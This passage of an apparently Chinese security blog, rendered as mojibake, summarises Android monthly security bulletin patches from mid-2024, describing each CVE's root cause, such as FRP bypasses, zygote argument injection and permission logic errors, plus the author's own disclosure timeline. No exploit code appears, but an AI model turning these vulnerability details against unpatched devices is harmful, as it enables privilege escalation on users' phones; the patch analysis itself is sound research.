https://github.com/canyie/CVE-2024-0044CVE-2024-40676 EoP High 1AccountManagerService checkKeyIntent å†…æ·»åŠ æ–°çš„æ£€æŸ¥ï¼Œæ‹’ç»æ‰€æœ‰ data å¸¦æœ‰ content URI çš„ intentã€‚å¥½æš´åŠ›çš„è¡¥ä¸ï¼Œè®©äººæ‘¸ä¸ç€å¤´è„‘ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ URI grantï¼Œä»”ç»†ç ”ç©¶ä¹‹åå‘ç°è¿˜ä¸æ˜¯ï¼Œé—®é¢˜æ¯”è¾ƒå¤æ‚ï¼Œåˆ©ç”¨éå¸¸ç²¾å¦™ï¼Œå‡†å¤‡ä»¥åå•ç‹¬å†™ä¸€ç¯‡æ–‡ç« æè¿°è¿™ä¸ªé—®é¢˜ï¼ˆæŒ–å‘+1ï¼‰ã€‚æ›´æ–°ï¼šå·²ç»ç»™å‡ºå®Œæ•´åˆ†æï¼Œå¯æŸ¥çœ‹ http://blog.canyie.top/2024/11/07/self-changing-data-type/CVE-2024-40675 DoS High 1æŠŠ URI è§£ææˆ Intent çš„æ—¶å€™æ£€æŸ¥é‡Œé¢æ¯ä¸ªå­—æ®µçš„ç»“å°¾åˆ†å·æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™ç›´æ¥ç»ˆæ­¢è§£æå¹¶æŠ›å‡º URISyntaxExceptionã€‚SystemCVE-2024-40673 RCE High 1Java ZipFile API æ‹’ç»æ–‡ä»¶å¤´æ— æ•ˆçš„ zip æ–‡ä»¶ã€‚æ›´å¤šè¯·å‚é˜…å‘ç°è€…çš„åšå®¢ï¼šhttps://wrlus.com/android-security/cve-2024-40673/CVE-2024-40672 EoP High 1è®¾ç½®å‘å¯¼ç»“æŸä¹‹å‰ä¸å…è®¸æ‰“å¼€ ChooserActivityï¼Œé¿å… FRP ç»•è¿‡ã€‚CVE-2024-40677 EoP High 1è®¾ç½®å‘å¯¼ç»“æŸä¹‹å‰ä¸å…è®¸æ‰“å¼€â€œåº”ç”¨ç”µæ± ç”¨é‡â€çš„ç®¡ç†é¡µé¢ï¼Œé¿å… FRP ç»•è¿‡ã€‚CVE-2024-40674 DoS High 1æ’å…¥ WifiConfiguration çš„æ—¶å€™ï¼Œå¦‚æœ SSID ä»¥å¼•å·å¼€å¤´ï¼Œä¹‹å‰çš„ä»£ç ä¸ä¼šæ£€æŸ¥å®ƒçš„é•¿åº¦ï¼Œå¯ä»¥å¯¼è‡´æ‹’ç»æœåŠ¡ã€‚è¡¥ä¸å°±æ˜¯åŠ ä¸Šäº†è¿™ç§æƒ…å†µçš„æ£€æŸ¥ã€‚åªå½±å“ 14ã€‚2024-09-01è¿™ä¸ªæ ç›®ä¸å¦‚æ”¹å«æ¯æœˆå®‰å…¨è¡¥ä¸æäº¤ä¿¡æ¯ç¿»è¯‘ éƒ½æ²¡å•¥åˆ†æäº†å·²çŸ¥è¢«åœ¨é‡åˆ©ç”¨æ¼æ´ï¼šCVE-2024-32896FrameworkCVE-2024-32896 EoP High 1 2æ¢å¤å‡ºå‚è®¾ç½®æ—¶ï¼Œåœ¨é‡å¯åˆ° recovery ä¹‹å‰åˆ é™¤ data åˆ†åŒºåŠ å¯†å¯†é’¥ï¼Œä¿è¯é‡å¯å¤±è´¥ï¼ˆæ¯”å¦‚æŒ‰éŸ³é‡é”®å¯¼è‡´è®¾å¤‡æå‰è¿›å…¥ bootloader æ¨¡å¼è€Œé recoveryï¼‰æ—¶è®¾å¤‡æ•°æ®ä¹Ÿæ— æ³•è¢«æ¢å¤ã€‚æ­¤æ¼æ´å·²çŸ¥æ­£åœ¨è¢«æ•°æ®å–è¯å…¬å¸åœ¨é‡åˆ©ç”¨ã€‚CVE-2024-40658 EoP High 1libstagefright ä¸­å¤„ç† HDR10+ è§†é¢‘çš„ä¸€ä¸ªè¶Šç•Œå†™å…¥é—®é¢˜ã€‚CVE-2024-40662 EoP High 1è§£æ uri æ—¶ç§»é™¤ scheme ä¸­çš„ â€œ://â€ å­—ç¬¦ä¸²ã€‚SystemCVE-2024-40650 EoP High 1è®¾ç½®åº”ç”¨ä¸­ç¼–è¾‘ wifi ä¿¡æ¯æ—¶é™åˆ¶æœ€é•¿åªèƒ½è¾“å…¥ 500 ä¸ªå­—ç¬¦ï¼Œçœ‹æ¼æ´æè¿°æ˜¯èƒ½ crash Settings ä»è€Œç»•è¿‡ FRPCVE-2024-40652 EoP High 1è®¾ç½®å‘å¯¼ç»“æŸä¹‹å‰å¦‚æœå°è¯•å¯åŠ¨ç³»ç»Ÿè®¾ç½®ï¼Œç›´æ¥å…³é—­CVE-2024-40654 EoP High 1è¡¥ä¸é“¾æ¥è·Ÿäº”æœˆä»½çš„ CVE-2024-23707 æ˜¯ä¸€æ ·çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆæ”¾äº†ä¸€éã€‚æ›´æ–°ï¼šæ³¨æ„åˆ°ä¹‹å‰çš„è¡¥ä¸åªç»™ 14 æ›´æ–°äº†ï¼Œè¿™æ¬¡ç»™ 12-14 éƒ½æ›´æ–°äº†ï¼Œåº”è¯¥æ˜¯è§£å†³ 14 ä¹‹å‰ç‰ˆæœ¬æ²¡æ‰“è¡¥ä¸çš„é—®é¢˜ã€‚CVE-2024-40655 EoP High 1ç»‘å®š CallScreenService è¶…æ—¶äº†ä¹Ÿéœ€è¦ unbindã€‚CVE-2024-40657 EoP High 1Settings åŠ è½½åº”ç”¨å®šä¹‰çš„è´¦å·é…ç½®é¡µé¢æ—¶ï¼Œç”±äºæ˜¯ç›´æ¥è§£æ xml ç„¶ååŠ è½½ï¼Œandroid:fragment è¿™ä¸ªå±æ€§ä¹Ÿä¼šç”Ÿæ•ˆï¼Œä»è€Œå¯ä»¥è°ƒèµ· Settings å†…çš„ä»»æ„ fragmentã€‚CVE-2024-40656 ID High 1ConnectionService createConference å¿˜äº†æ£€æŸ¥ä¼ å…¥çš„ StatusHints æ˜¯å¦åŒ…å«è·¨ç”¨æˆ·çš„ iconã€‚CVE-2024-40659 DoS High 1RKP app çš„ RemoteProvisioningService é™åˆ¶åªèƒ½ system server æ‰èƒ½ bindã€‚è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¾ˆæ—©å°±æ³¨æ„åˆ°äº†ï¼Œä½†æ˜¯ç ”ç©¶ä¹‹åè§‰å¾—æ²¡æœ‰å®‰å…¨é£é™©å°±æ²¡æŠ¥ï¼Œç»“æœæ˜¯é«˜å±æ¼æ´ï¼Œç—›å¤± 7000 ğŸ˜­ è™½ç„¶æ²¡çœ‹æ‡‚å’‹è§¦å‘ DoSï¼Œçœ‹æè¿°æ˜¯å¯ä»¥ä¸ºå…¶ä»–åº”ç”¨ä¸Šä¼ å¯†é’¥ä»è€ŒæŒä¹…ç¦ç”¨ç›¸å…³åŠŸèƒ½ã€‚å…³äº RKP çš„åŠŸèƒ½è¯´æ˜ï¼šhttps://t.me/vvb2060Channel/8122024-08-01å¯èƒ½è¢«åœ¨é‡åˆ©ç”¨çš„æ¼æ´ï¼šCVE-2024-36971ï¼Œå†…æ ¸çš„ä¸€ä¸ª UAF æ¼æ´ï¼ˆä¸¥é‡æ€€ç–‘æ‰“é”™äº†ï¼Œå¯èƒ½æƒ³å†™çš„æ˜¯ CVE-2024-34735ï¼‰FrameworkCVE-2023-20971 EoP High 1PermissionManagerServiceImpl ä¸­ï¼Œæœ‰ä¸ªåˆ¤æ–­çœ‹æ˜¯ä¸æ˜¯å°è¯•ç§»é™¤éåŠ¨æ€çš„æƒé™ï¼Œç»“æœåªæœ‰ä¸ª log å¿˜äº† returnã€‚è¿™ä¸ª CVE å»å¹´åœ¨ Pixel å…­æœˆå…¬å‘Šå°±å‡ºç°è¿‡ï¼Œå½“æ—¶è¯„çš„æ˜¯ moderateï¼Œç»™ 13 æ›´æ–°äº†ï¼Œç»“æœè¿™æ¬¡å¥‡æ€ªåœ°ç»™ 14 ä¹Ÿæ›´æ–°äº†ï¼Œè¡¥ä¸æ˜¯ä»Šå¹´åˆ›å»ºçš„ï¼Œé‡Œé¢çš„ android id ä¹Ÿè·Ÿå…¬å‘Šé‡Œçš„å¯¹ä¸ä¸Šï¼Œç¿» CVE æè¿°ä¹Ÿæ˜¯è¯´é—®é¢˜åœ¨ updatePermissionTreeSourcePackage é‡Œè€Œéè¡¥ä¸æ”¹çš„ removePermissionï¼Œæ€€ç–‘æ ¹æœ¬å°±ä¸æ˜¯åŒä¸€ä¸ªé—®é¢˜ï¼Œä¸çŸ¥é“ä¸ºå•¥å¤ç”¨äº† CVE IDã€‚Summaryï¼šprivilege escalation - obtain dangerous system permissions silently utilizing the &lt;permission-tree&gt; elementDetailsï¼šIn removePermission of PermissionManagerServiceImpl.java, there is a possible way to obtain dangerous permissions without user consent due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.In updatePermissionTreeSourcePackage of PermissionManagerServiceImpl.java, there is a possible way to obtain dangerous permissions without user consent due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-225880325CVE-2023-21351 EoP High 1è·Ÿ CVE-2024-0034 ç±»ä¼¼ï¼Œç»™ Android 14 ä»¥ä¸‹ç³»ç»Ÿçš„ï¼Œç»‘å®šåˆ° TextToSpeech Serviceï¼ŒJob Serviceï¼ŒPrint Serviceï¼ŒSync Service å’Œ MediaRoute2Provider Service çš„æ—¶å€™æŒ‡å®š flag é˜»æ­¢ BALï¼ˆæ—©ä¸ç»™ï¼Œè¿™éƒ½24å¹´8æœˆäº†æ‰ç»™ï¼‰CVE-2024-34731 EoP High 1 2 3 4 5åŒæ—¶ä¿®æ”¹äº†äº”ä¸ªæ¨¡å—ï¼ˆhealth HALã€libmediatranscodingã€neuralnetworksã€keystore2ã€nfcï¼‰çš„ä»£ç ï¼Œçœ‹èµ·æ¥æ˜¯å¯¹ Binder DeathRecipient cookie çš„ç®¡ç†é—®é¢˜ã€‚å»ç¿»äº†ä¸€ä¸‹æ–‡æ¡£ï¼ŒAIBinder_unlinkToDeath çš„æ–‡æ¡£é‡Œæœ‰è¿™å¥è¯ï¼šBe aware that it is not safe to immediately deallocate the cookie when this call returns. If you need to clean up the cookie, you should do so in the onUnlinked callback, which can be set using AIBinder_DeathRecipient_setOnUnlinked.CVE-2024-34734 EoP High 1é”å±çš„æ—¶å€™ä¸‹æ‹‰çŠ¶æ€æ ï¼Œç‚¹å¼€ Active appsï¼Œé‡Œé¢ä¼šæ˜¾ç¤ºå½“å‰æ´»è·ƒçš„åº”ç”¨ï¼Œå³è¾¹æœ‰ä¸ª Stop æŒ‰é’®åœæ­¢è¿›ç¨‹ï¼Œç”¨è¿™ç§æ–¹å¼å¯ä»¥æ€æ‰ VPN appã€‚åº”è¯¥æ”¹æˆå…ˆè§£é”å†æ˜¾ç¤ºã€‚CVE-2024-34735 EoP High 1è¡¥ä¸é“¾æ¥è·Ÿ CVE-2023-21351 æ˜¯ä¸€æ ·çš„ã€‚CVE-2024-34737 EoP High 1é™åˆ¶ app ä¸€åˆ†é’Ÿåªèƒ½ä¿®æ”¹ 60 æ¬¡ PiP aspect ratioï¼Œå¦åˆ™ â€œcould result flood of PiP resizing requests and freeze the PiP windowâ€ã€‚æ€€ç–‘æ˜¯å¯¼è‡´ pip çª—å£æ¸²æŸ“å¼‚å¸¸ï¼Œä½¿å¾—å…¶ä¸å¯è§ï¼Œä»è€Œåœ¨ç”¨æˆ·æ— æ„ŸçŸ¥çš„æƒ…å†µä¸‹é•¿æœŸæŒæœ‰å‰å°æƒé™ã€‚setAspectRatio æ–‡æ¡£ï¼šhttps://developer.android.com/reference/android/app/PictureInPictureParams.Builder#setAspectRatio(android.util.Rational)æ›´æ–°ï¼šæœ‰äººå¤ç°äº†è¿™ä¸ªæ¼æ´ï¼Œè§ https://blog.lleavesg.top/article/EvilPiP#1153fb9e943280f5ae27d6c44fc85d79CVE-2024-34738 EoP High 1å¦‚æœè°ƒç”¨è€…æ²¡æœ‰ GET_APP_OPS_STATS ç‰¹æƒï¼Œä¸è¿”å›è¢«æ ‡è®°äº† restrictRead çš„ Opã€‚ç®€å•æœç´¢åªæ‰¾åˆ° ACCESS_RESTRICTED_SETTINGS ä¸€é¡¹æ˜¯ restricted çš„ï¼Œä¸çŸ¥é“å…·ä½“æœ‰ä»€ä¹ˆä½œç”¨ã€‚CVE-2024-34739 EoP High 1è®¾ç½®å‘å¯¼æœªå®Œæˆæ—¶ï¼Œæ’å…¥ USB è®¾å¤‡ä¸å¼¹å‡º activityï¼Œé¿å… FRP ç»•è¿‡ã€‚CVE-2024-34740 EoP High 1 2FastDataOutput å†…ä¼šæ£€æŸ¥ä¸€æ¬¡å†™å…¥çš„å­—ç¬¦ä¸²æ•°æ®ä¸èƒ½è¶…è¿‡ 65535 ä¸ªå­—èŠ‚ï¼Œä½† BinaryXmlSerializer ä¸­ attributeBytesHex ä¸ attributeBytesBase64 ä¸¤ä¸ªæ–¹æ³•ä¼šæŒ‰ç…§ byte[] å†™å…¥ï¼Œèµ°è¿™æ¡è·¯å¾„æ˜¯æ²¡æœ‰æ£€æŸ¥çš„ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•ä¼šå°† value çš„é•¿åº¦ä½œä¸ºä¸€ä¸ª unsigned short å†™å…¥ï¼Œå¦‚æœ length &gt; 65535 å°±ä¼šä¸¢å¤±é«˜ä½çš„æ•°æ®ï¼Œä¹‹åå°† value ä½œä¸º byte[] æ•´ä½“å†™å…¥ã€‚ä¸‹æ¬¡å¼€æœºæ—¶ä½¿ç”¨ BinaryXmlPullParser è¯»å–å¹¶è§£æè¯¥æ–‡ä»¶ï¼Œå…ˆè¯»æ•°æ®é•¿åº¦ï¼ˆunsigned shortï¼‰å†è¯»å¯¹åº”å¤§å°çš„æ•°æ®ï¼Œä¼šå¯¼è‡´æ•°æ®æ²¡è¢«å®Œå…¨æ¶ˆè€—å®Œï¼Œåç»­è§£æå‡ºæ¥çš„æ•°æ®è¢«æ±¡æŸ“ï¼Œåˆç†åˆ©ç”¨å¯ä»¥å®ç°æ³¨å…¥ã€‚CVE-2024-34741 EoP High 1WindowState setForceHideNonSystemOverlayWindowIfNeeded å†…è¦æ£€æŸ¥çˆ¶çª—å£çš„å±æ€§ï¼Œå¦åˆ™ SAW çª—å£ä¸‹çš„å…¶ä»–ç±»å‹å­çª—å£ä¸ä¼šè¢«éšè—CVE-2024-34743 EoP High 1surfaceflinger å†…éå† states æ—¶å†™æˆäº†å€¼æ‹·è´ï¼Œç„¶å sanitize äº‹å®ä¸Šä¸ä¼šå½±å“åˆ°åŸæ¥çš„å¯¹è±¡ï¼Œåº”è¯¥æ”¹æˆç”¨å¼•ç”¨ã€‚CVE-2024-34736 ID High 1StagefrightRecoder åœ¨éŸ³æºä¸ºéº¦å…‹é£ä¸”è§†é¢‘æºä¸º surfaceï¼ˆè®¾å¤‡ç”»é¢ï¼Ÿï¼‰æ—¶ç¦ç”¨ B å¸§æ”¯æŒï¼Œå¦åˆ™ä¼šå‡ºç°ä¸åŒæ­¥ã€‚éŸ³è§†é¢‘è¶…å‡ºäº†æˆ‘çš„çŸ¥è¯†ä½“ç³»ï¼Œæ²¡åŠæ³•å•Š~~CVE-2024-34742 DoS High 1æ›´æ”¹é€»è¾‘ä¿è¯æ•°æ®å§‹ç»ˆè¢«å†™å…¥åˆ° device_owners2.xml ã€‚åªå½±å“14ï¼Œåº”è¯¥è·Ÿä¹‹å‰çš„ CVE-2024-0047 æ˜¯ç±»ä¼¼çš„é—®é¢˜ã€‚SystemCVE-2024-34727 ID High 1è“ç‰™ sdp_utils.cc ä¸­æ£€æŸ¥ p_attr-&gt;attr_len_type æ˜¯å¦ä¸ºé¢„æœŸï¼Œé˜²æ­¢åç»­ç¼“å†²åŒºæº¢å‡ºã€‚2024-07-01å·²çŸ¥è¢«åˆ©ç”¨æ¼æ´ï¼šArm Mali GPU Kernel Driver Use-After-Free Vulnerability CVE-2024-4610ï¼ˆAndroid å®‰å…¨å…¬å‘Šæœªå‘å‡ºè­¦å‘Šï¼Œä¿¡æ¯æ¥æºäº CISA Known Exploited Vulnerabilities Catalogï¼‰FrameworkCVE-2024-31320 EoP Critical 1 2CompanionDeviceManagerService å¤„ç†é…å¯¹è¯·æ±‚æ—¶æ¥å—ä¸€ä¸ª AssociationRequestï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªå˜é‡ mSkipPrompt å¯ä»¥è·³è¿‡ç”¨æˆ·ç¡®è®¤ï¼ŒåŸæœ¬é¢„æœŸè¿™ä¸ªå€¼åªåº”è¯¥ç”±ç³»ç»Ÿè®¾ç½®ï¼Œä½†ä»£ç é‡Œå‡ºç°é€»è¾‘é”™è¯¯ï¼ŒmayAssociateWithoutPrompt è¿”å› false æ—¶æ²¡æœ‰è¦†ç›–æ‰ app è®¾ç½®çš„å€¼ã€‚åªå½±å“ Android 13 ä»¥å‰ã€‚è¿™ä¸ªä¸¥é‡ç»™çš„åå‰¯å…¶å®ï¼Œå¯æƒœæˆ‘çš„ CVE-2024-31318 æ²¡ç»™ä¸¥é‡ ğŸ˜­CVE-2024-31331 EoP High 1è°ƒç”¨ setMimeGroup æˆåŠŸåè¦å‘é€ ACTION_PACKAGE_CHANGED å¹¿æ’­ã€‚ä¸æ‡‚ä¸å‘é€ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ã€‚æ¼æ´æè¿°ï¼šIn setMimeGroup of PackageManagerService.java, there is a possible way to hide the service from Settings due to a logic error in the code. This could lead to local escalation of privilege with User execution privileges needed. User interaction is needed for exploitation.CVE-2024-34720 EoP High 1æœ‰æ–°è¿›ç¨‹è¿æ¥åˆ° Zygote æ—¶æ ¡éªŒå…¶ UIDï¼Œç¡®ä¿æ˜¯ system UIDã€‚åŸæœ¬ selinux policy ä¼šé™åˆ¶åªå…è®¸ system server è¿æ¥åˆ° zygote è¿›ç¨‹ï¼Œä½†æ˜¯å¯¹ app zygote è¿™ä¸ªé™åˆ¶ä¸å¤Ÿä¸¥æ ¼ï¼Œä¸¤ä¸ª app zygote è¿›ç¨‹å¯ä»¥ç›¸äº’è¿æ¥ç„¶åå‘é€ä¼ªé€ å‘½ä»¤ã€‚æ›´å¤šå…³äº app zygote å¯ä»¥å‚è€ƒ android:usesAppZygote å’Œ ZygotePreload çš„æ–‡æ¡£ï¼Œæˆ‘ä¹‹å‰çš„æ£€æµ‹ magisk é‚£ç¯‡æ–‡ç« ä¹Ÿæœ‰ç®€å•æåŠã€‚CVE-2024-34723 EoP High 1MediaSession ParcelableListBinder åªå…è®¸å¡å…¥æŒ‡å®šç±»å‹çš„å¯¹è±¡ï¼Œé˜²æ­¢åå°å¯åŠ¨ç»•è¿‡ã€‚è¿™ä¸ªé—®é¢˜ä¹‹åä¼šå•ç‹¬å†™ä¸€ç¯‡æ–‡ç« è®²è§£ã€‚SystemCVE-2024-31332 EoP High 1å¦‚æœå½“å‰ç”¨æˆ·è¢«è®¾ç½®äº† DISALLOW_ADD_WIFI_CONFIGï¼Œä¸æ˜¾ç¤º WifiDppConfiguratorActivity å’Œ AddNetworkFragmentã€‚CVE-2024-31339 EoP High 1statsd ä¸­ï¼ŒMultiConditionTrigger å¯èƒ½ä¼šå¼€å¯ä¸€ä¸ªæ–°çº¿ç¨‹ executorThreadï¼Œè¯¥çº¿ç¨‹ä¼šæŒæœ‰å¤–éƒ¨èµ„æºå¼•ç”¨ï¼Œåº”è¯¥åœ¨ MultiConditionTrigger è¢«é”€æ¯æ—¶ join è¿™ä¸ªçº¿ç¨‹ä¿è¯å®ƒæ‰§è¡Œå®Œæ¯•ã€‚åº”è¯¥æ˜¯ race condition å¯¼è‡´ UAF çš„é—®é¢˜ã€‚CVE-2024-34722 EoP High 1è“ç‰™ç»„ä»¶çš„é—®é¢˜ï¼Œä¼¼ä¹æ˜¯é€»è¾‘ bugã€‚çœ‹ä¸æ‡‚ï¼Œå‘Šè¾~12345Fix an authentication bypass bug in SMPWhen pairing with BLE legacy pairing initiatedfrom remote, authentication can be bypassed.This change fixes it.CVE-2024-34721 ID High 1MediaProvider ä¸­æ’å…¥æ–‡ä»¶æ—¶ï¼Œå¯¹æ–‡ä»¶è·¯å¾„æ²¡æœ‰è¢«æ˜¾å¼æŒ‡å®šçš„æƒ…å†µç¼ºä¹æ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥æ’å…¥åˆ°å…¶ä»–ç”¨æˆ·çš„å‚¨å­˜ã€‚å¬èµ·æ¥æŒºæœ‰æ„æ€çš„ï¼Œåç»­å¯ä»¥å¤ç°ç©ç©ã€‚2024-06-01è¿™ä¸ªæœˆç«Ÿç„¶ä¸€ä¸ª critical éƒ½æ²¡æœ‰ï¼Œå¥‡è¿¹å•ŠFrameworkCVE-2023-21266 EoP High 1ç¦æ­¢ç¬¬ä¸‰æ–¹åº”ç”¨é€šè¿‡ killBackgroundProcesses() æ€æ­»å…¶ä»–åº”ç”¨çš„è¿›ç¨‹ã€‚çœ‹ CVE æè¿°æ˜¯èƒ½ä¸€ç›´æ€ play ä¿æŠ¤æœåŠ¡çš„è¿›ç¨‹ä»è€Œç»•è¿‡ play ä¿æŠ¤ã€‚å»å¹´ 10 æœˆå°±æ”¾è¿‡ä¸€éäº†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆæ”¾äº†ä¸€éã€‚CVE-2024-31310 EoP High 1å¼ºåˆ¶è‡ªåŠ¨å¡«å……æœåŠ¡å¿…é¡»å£°æ˜å¯¹åº”çš„ intent-filterã€‚æ²¡æœ‰è¿½è¯¦ç»†è°ƒç”¨é“¾ï¼ŒçŒœæµ‹æ˜¯ä¸ºäº†é˜²æ­¢ serviceComponent è¢«ä»»æ„æŒ‡å®šï¼Œè°ƒç”¨åˆ°æœªå¯¼å‡ºçš„ serviceï¼Ÿæ›´æ–°ï¼šæ¼æ´æè¿°æŒ‡å‡ºäº†ç»†èŠ‚ï¼šç”¨æˆ·é€‰æ‹©å®ƒä¸ºè‡ªåŠ¨å¡«å…… app -&gt; apk æ›´æ–°ï¼Œæ–°çš„ apk é‡Œè¿™ä¸ªæœåŠ¡ç¼ºå¤± intent-filter -&gt; ç³»ç»Ÿè‡ªåŠ¨é‡ç»‘å®šè¯¥æœåŠ¡ -&gt; ç”¨æˆ·å»è®¾ç½®é‡ŒæŸ¥çœ‹æ—¶ï¼Œç”±äºæ­¤æ—¶è¯¥ service æ²¡æœ‰ intent-filterï¼Œè¯¥ app ä¸ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ã€‚Summary: App can continue to fill input fields in the device even if user has not selected it as default Autofill service app.Details: In newServiceInfoLocked of AutofillManagerServiceImpl.java, there is a possible way to hide an enabled Autofill service app in the Autofill service settings due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.CVE-2024-31316 EoP High 1AccountManagerService åœ¨ä¿®æ”¹è¿”å›çš„ bundle ï¼ˆå…·ä½“æ˜¯ä¸‰å¤„ remove æ•æ„Ÿä¿¡æ¯çš„åœ°æ–¹ï¼‰ä¹‹åé‡æ–°æ£€æŸ¥ bundle å†…çš„ intent æ˜¯å¦åˆæ³•ã€‚ç®€å•æƒ³äº†ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ° lazy bundle åŠ æŒä¸‹èƒ½æ€ä¹ˆåˆ©ç”¨ï¼ŒçŒœæµ‹æ˜¯åœ¨é lazy bundle çš„åœºæ™¯ä¸‹ï¼ŒæŒ‰ç…§ mismatch å¯¹è±¡ã€è¢«ç§»é™¤çš„é”®å€¼å¯¹ã€æ¶æ„ intent è¿™ä¸ªé¡ºåºæ”¾ç½®æ¥ç»•è¿‡ checkKeyIntentParceledCorrectlyï¼ŸCVE-2024-31317 EoP High 1å¦‚æœè®¾ç½®çš„ hidden api exemptions å«æœ‰éæ³•å­—ç¬¦ï¼Œä¸æŠŠå®ƒä¼ é€’ç»™ zygoteï¼Œé˜²æ­¢å¹²æ‰°å‚æ•°è§£æã€‚æ­¤æ¼æ´å¯è¢«ç”¨äºä¼ªé€  uid ç­‰å‚æ•°ï¼Œåœ¨ä»»æ„ app ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.htmlCVE-2024-31318 EoP High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚CompanionDeviceManagerService onShellCommand() å†…æ²¡æœ‰æ£€æŸ¥è°ƒç”¨è€…æƒé™ï¼Œç„¶åç›´æ¥è°ƒç”¨äº†åŒæ ·æ²¡æœ‰æƒé™æ£€æŸ¥çš„å†…éƒ¨æ¥å£ï¼Œé€ æˆè¶Šæƒè®¿é—®ï¼Œå¹¶ç›´æ¥é€ æˆæƒé™æå‡ã€‚ä¿®å¤ä¸ºæŠŠ onShellCommand() æ”¹æˆé‡å†™ handleShellCommand()ï¼Œå› ä¸º Binder.onShellCommand() ä¼šå…ˆæ£€æŸ¥è°ƒç”¨è€… uid ç¡®ä¿å¿…é¡»æ˜¯ root/shellã€‚å…³äºè¿™ä¸ªæ¼æ´çš„ä¸€ç‚¹ç‚¹ç•ªå¤–ï¼šé€šè¿‡åˆ†ææäº¤å†å²ï¼Œæˆ‘å‘ç°è¿™ä¸ªå‡½æ•°ä»¥å‰å…¶å®æ˜¯æœ‰ä¸€ä¸ªæƒé™æ£€æŸ¥çš„ï¼Œä½†æ˜¯åœ¨ Android 14 çš„ä¸€ä¸ªæäº¤ https://cs.android.com/android/_/android/platform/frameworks/base/+/7a8f22792e45630bff14eb8b276c7649b0d79097 é‡Œè¢«äººåˆ æ‰äº†ã€‚æ‰€ä»¥è¿™å…¶å®æ˜¯ä¸€ä¸ªåªå½±å“ Android 14 çš„æ¼æ´ï¼ˆè¿™ä¸‹æ–°ç‰ˆæœ¬é­”äººå¤§å¤±è´¥äº†ï¼‰ã€‚ç”±äºæˆ‘ä¸æ˜¯ Google å‘˜å·¥ï¼Œæ²¡æ³•ç›´æ¥çŸ¥é“è¿™ä¸ªäººè¿™ä¹ˆåšçš„åŸå› ï¼Œæˆ‘è¿™é‡Œåªèƒ½çŒœæµ‹ä¸€ä¸‹ï¼šå¯èƒ½æ˜¯çœ¼èŠ±äº†æŠŠè¿™é‡Œçœ‹æˆå·²ç»åœ¨ç”¨ handleShellCommand äº†ï¼Œå¯èƒ½æ˜¯è§‰å¾—æƒé™æ£€æŸ¥é‡å¤ï¼ˆAndroid 12 çš„æ—¶å€™è¿™å—ä»£ç åœ¨ ShellCmd æ„é€ å‡½æ•°é‡Œï¼‰ï¼Œæˆ–è€…å¹²è„†å°±æ˜¯ git å‡ºäº† bug æŠŠè¿™è¡Œç»™æ„å¤–ç§»é™¤äº†ï¼Œç±»ä¼¼é‚£ä¸ª gotofail æ¼æ´ã€‚ç»§ç»­è¿½è¸ªæäº¤å†å²ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªæ›´æç¬‘çš„ï¼š2020 å¹´ï¼ŒåŒæ ·çš„ç³»ç»ŸæœåŠ¡ï¼ŒåŒæ ·çš„ onShellCommandï¼Œæ›¾ç»å‡ºç°è¿‡ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„æ¼æ´ CVE-2020-0227 https://android.googlesource.com/platform/frameworks/base/+/84cccfe6cdbc57ee372ee1a0fea64c7a11c53766^!/#F1 ã€‚å—¯ï¼Œè®©ä½ ä¸å†™å›å½’æµ‹è¯•ï¼Œç™½ç»™èµé‡‘äº†è¿™ä¸‹ã€‚æ—¶é—´çº¿ï¼š2023.10.4 Android 14 æ­£å¼å‘å¸ƒ2023.11.25 æˆ‘æ³¨æ„åˆ°æ­¤æ¼æ´2023.11.26 æ„å»ºäº† PoC å¹¶å‘ Android å®‰å…¨å›¢é˜Ÿåé¦ˆ2024.2.10 Google ç¡®è®¤æ­¤æ¼æ´å¹¶å°†ä¸¥é‡ç¨‹åº¦è¯„çº§ä¸ºé«˜ã€‚å¯¹ï¼Œä½ æ²¡çœ‹é”™ï¼Œä¸¤ä¸ªåŠæœˆ2024.5.21 Google é€šçŸ¥æˆ‘è¡¥ä¸å°†åœ¨ä¸‹ä¸ªæœˆå‘å¸ƒï¼Œå¹¶åˆ†é… CVE-2024-313182024.6.3 å·²ç»è¿‡å»äº† 190 å¤©ï¼Œè¡¥ä¸ç»ˆäºå‘å¸ƒCVE-2024-31319 EoP High 1NotificationListenerService ä¿®æ”¹ notification channel çš„ sound æ—¶ï¼Œæ ¡éªŒå®ƒæ˜¯å¦æœ‰æƒé™è®¿é—®è¿™ä¸ª uriã€‚ï¼ˆæ¼æ´ç±»å‹ä¸åº”è¯¥ç»™ ID å—ï¼Œä¸ºå•¥ç»™äº†ä¸ª EoPï¼Ÿï¼‰CVE-2024-31322 EoP High 1å¯¹äºè¢«å¸è½½çš„åº”ç”¨ï¼ŒæŠŠå…¶æä¾›çš„ AccessibilityService ä»å·²å¯ç”¨çš„æœåŠ¡åˆ—è¡¨é‡Œé¢ç§»é™¤ã€‚æˆ‘è®°å¾—è¿™ä¸ªé—®é¢˜ä»¥å‰å¥½åƒå¤„ç†è¿‡ä¸€æ¬¡ï¼Œå‘ä¸Šè¿½äº†ä¸€ä¸‹ï¼Œåªæœ‰åœ¨ onUserStateChangedLocked() 